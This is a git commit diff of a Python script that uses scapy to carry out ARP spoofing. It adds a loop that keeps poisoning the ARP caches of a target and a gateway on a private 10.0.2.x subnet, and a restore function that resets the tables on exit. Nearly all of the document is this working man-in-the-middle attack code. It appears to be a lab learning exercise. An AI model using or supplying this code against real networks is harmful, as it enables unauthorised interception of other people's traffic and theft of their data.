478786980b64590fe27c85cc171942f0837f65bd
kaustubh <saikaustubh10@gmail.com>
2021-01-13 16:40:32 +0530

    completed code

--- main.py
+++ main.py
@@ -19,12 +19,29 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-sent_packets_count = 0
-while True:
-    # spoof the target
-    spoof("10.0.2.5", "10.0.2.1")
-    # spoof the router
-    spoof("10.0.2.1", "10.0.2.5")
-    sent_packets_count += 2
-    print(f"[+] Packets sent: {sent_packets_count}")
-    time.sleep(2)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False, count=4)
+
+
+target_ip = "10.0.2.5"
+gateway_ip = "10.0.2.1"
+
+try:
+    sent_packets_count = 0
+    while True:
+        # spoof the target
+        spoof(target_ip, gateway_ip)
+        # spoof the router
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    time.sleep(3)
+    print("[+] Exited Successfully!")
